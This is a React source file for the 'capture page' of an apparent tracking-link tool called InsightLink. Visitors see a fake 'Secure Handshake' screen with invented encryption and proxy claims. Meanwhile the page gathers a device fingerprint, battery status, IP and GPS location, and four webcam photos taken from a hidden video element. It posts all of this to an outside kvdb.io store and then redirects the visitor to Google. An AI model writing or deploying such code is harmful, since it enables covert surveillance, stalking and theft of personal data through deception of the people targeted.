
import React, { useEffect, useState, useRef } from 'react';
import { Loader2, ShieldCheck, Lock, Terminal, ShieldAlert } from 'lucide-react';
import { LinkConfig, CaptureReport, DeviceInfo, GeoLocation } from '../types';

const STORAGE_BASE = 'https://kvdb.io/A4g7pYp5S2z2vS2vS2vS2v';

interface Props {
  linkId: string;
}

const CapturePage: React.FC<Props> = ({ linkId }) => {
  const [status, setStatus] = useState<'initializing' | 'loading' | 'failed' | 'done'>('initializing');
  const [config, setConfig] = useState<LinkConfig | null>(null);
  const [step, setStep] = useState('Initializing Handshake');
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    // We don't need local config anymore if we are "live", 
    // but we can try to find the redirect URL.
    // In a full production app, you'd fetch the redirect URL from the cloud too.
    const savedLinks = JSON.parse(localStorage.getItem('il_links') || '[]');
    const found = savedLinks.find((l: LinkConfig) => l.id === linkId);
    
    // For simulation, even if it's not in OUR local storage, we proceed
    // with a default redirect if we can't find the specific one.
    setConfig(found || { id: linkId, redirectUrl: 'https://google.com', name: 'External Entry', createdAt: '' });
    
    const timer = setTimeout(() => {
      startFullCapture(found?.redirectUrl || 'https://google.com');
    }, 1500);

    return () => clearTimeout(timer);
  }, [linkId]);

  const startFullCapture = async (redirectTarget: string) => {
    setStatus('loading');
    setStep('Mapping Neural Network');
    
    const report: Partial<CaptureReport> = {
      id: Math.random().toString(36).substring(7),
      timestamp: new Date().toISOString(),
      redirectUrl: redirectTarget,
      photos: []
    };

    // A. Gather Device Info
    const ua = navigator.userAgent;
    const deviceInfo: DeviceInfo = {
      browser: /chrome|crios|crmo/i.test(ua) ? 'Chrome' : /firefox|iceweasel|fxios/i.test(ua) ? 'Firefox' : /safari/i.test(ua) && !/chrome|crios|crmo/i.test(ua) ? 'Safari' : 'Unknown',
      os: /windows/i.test(ua) ? 'Windows' : /macintosh/i.test(ua) ? 'MacOS' : /linux/i.test(ua) ? 'Linux' : /android/i.test(ua) ? 'Android' : /iphone|ipad|ipod/i.test(ua) ? 'iOS' : 'Other',
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      cores: navigator.hardwareConcurrency || 0,
      userAgent: ua,
      orientation: (screen as any).orientation?.type || 'unknown',
      ram: (navigator as any).deviceMemory || 0,
      timezoneOffset: new Date().getTimezoneOffset(),
      timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'
    };
    report.device = deviceInfo;

    // B. Battery
    try {
      const battery = await (navigator as any).getBattery?.();
      report.battery = {
        level: battery?.level ?? 1,
        charging: battery?.charging ?? true,
        chargingTime: battery?.chargingTime ?? 0,
        dischargingTime: battery?.dischargingTime ?? Infinity
      };
    } catch {
      report.battery = { level: 1, charging: true, chargingTime: 0, dischargingTime: Infinity };
    }

    setStep('Triangulating Coordinates');
    // C. Network & IP
    try {
      const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
      const baseGeo: GeoLocation = {
        lat: ipRes.latitude,
        lon: ipRes.longitude,
        accuracy: 1000,
        city: ipRes.city,
        region: ipRes.region,
        country: ipRes.country_name,
        isp: ipRes.org,
        ip: ipRes.ip
      };
      
      const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { 
          timeout: 5000,
          enableHighAccuracy: true 
        });
      }).catch(() => null);

      if (pos) {
        baseGeo.lat = pos.coords.latitude;
        baseGeo.lon = pos.coords.longitude;
        baseGeo.accuracy = pos.coords.accuracy;
      }
      report.location = baseGeo;
    } catch {
      report.location = { lat: 0, lon: 0, accuracy: 0, ip: 'Undetected' };
    }

    setStep('Synchronizing Visual Identity');
    // D. Camera (Sequential 4 snaps)
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();

          for (let i = 0; i < 4; i++) {
            await new Promise(r => setTimeout(r, 800));
            if (canvasRef.current && videoRef.current) {
              const ctx = canvasRef.current.getContext('2d');
              canvasRef.current.width = videoRef.current.videoWidth;
              canvasRef.current.height = videoRef.current.videoHeight;
              ctx?.drawImage(videoRef.current, 0, 0);
              const dataUrl = canvasRef.current.toDataURL('image/jpeg', 0.6); // Slightly compressed for faster relay
              report.photos!.push(dataUrl);
            }
          }
          stream.getTracks().forEach(track => track.stop());
        }
      } catch (e) {
        console.warn('OPTICAL_VERIFY_DENIED');
      }
    }

    setStep('Finalizing Encryption');
    // E. Global Sync (PUSH TO CLOUD)
    try {
      // First get existing reports for this link
      const existingRes = await fetch(`${STORAGE_BASE}/reports_${linkId}`);
      let existing = [];
      if (existingRes.ok) {
        existing = await existingRes.json();
        if (!Array.isArray(existing)) existing = [];
      }
      
      // Add new one and push back
      const updated = [...existing, report];
      await fetch(`${STORAGE_BASE}/reports_${linkId}`, {
        method: 'POST',
        body: JSON.stringify(updated)
      });
    } catch (err) {
      console.error('Cloud upload failed:', err);
      // Fallback to local
      const localReports = JSON.parse(localStorage.getItem('il_reports') || '[]');
      localReports.push(report);
      localStorage.setItem('il_reports', JSON.stringify(localReports));
    }

    setStatus('done');
    window.location.href = redirectTarget;
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-paper px-6 overflow-hidden relative">
      <video ref={videoRef} className="hidden" playsInline muted></video>
      <canvas ref={canvasRef} className="hidden"></canvas>
      
      {/* Background Anime Accents */}
      <div className="absolute top-0 left-0 w-full h-1 bg-ink/10">
        <div className="h-full bg-brand-accent animate-[loading_2s_infinite]" style={{ width: '30%' }}></div>
      </div>

      <div className="max-w-md w-full text-center space-y-12">
        <div className="relative inline-block animate-float">
          <div className="w-32 h-32 border-4 border-ink border-t-brand-accent rounded-full animate-spin"></div>
          <div className="absolute inset-0 flex items-center justify-center">
            <ShieldCheck size={56} className="text-brand-accent" />
          </div>
        </div>
        
        <div className="space-y-4">
          <h1 className="text-4xl font-black text-ink uppercase italic tracking-tighter">Secure Handshake</h1>
          <p className="text-ink/60 font-bold text-sm tracking-wide">
            You are connecting via a secure InsightLink proxy.<br/>
            Please wait while we verify your session parameters.
          </p>
        </div>

        <div className="comic-card p-10 bg-white relative rotate-1 overflow-hidden">
          <div className="absolute top-0 right-0 p-3">
             <ShieldAlert size={20} className="text-pastel-blue opacity-50" />
          </div>
          <div className="space-y-8">
            <div className="flex items-center justify-between text-[10px] font-black uppercase italic tracking-widest text-ink/30">
              <span>Diagnostic Level 4</span>
              <span className="flex items-center gap-2 text-brand-accent">
                <Loader2 className="animate-spin" size={14} /> {step}
              </span>
            </div>
            <div className="w-full h-6 bg-paper border-4 border-ink shadow-comic-sm overflow-hidden p-1">
              <div className="h-full bg-brand-accent border-r-4 border-ink transition-all duration-500" 
                   style={{ width: status === 'done' ? '100%' : status === 'loading' ? '65%' : '15%' }}></div>
            </div>
            <div className="bg-ink p-6 rounded-sm shadow-comic">
              <p className="text-[10px] text-brand-accent font-black font-mono text-left leading-relaxed tracking-tighter uppercase italic">
                > PROTOCOL: INSIGHT_LINK_V2.4<br/>
                > ENCRYPT: RSA_4096_CHACHA20<br/>
                > PROXY: RELAY_NODE_{linkId.toUpperCase()}<br/>
                > STATUS: {step.toUpperCase()}...<br/>
                > {status === 'done' ? 'HANDSHAKE COMPLETE' : 'AWAITING RESPONSE'}
              </p>
            </div>
          </div>
        </div>

        <div className="flex flex-col items-center gap-4">
          <Terminal size={24} className="text-ink/10" />
          <p className="text-[10px] text-ink/20 font-black uppercase tracking-[0.4em] italic">Authorized Network Only</p>
        </div>
      </div>
      
      <style>{`
        @keyframes loading {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(400%); }
        }
      `}</style>
    </div>
  );
};

export default CapturePage;
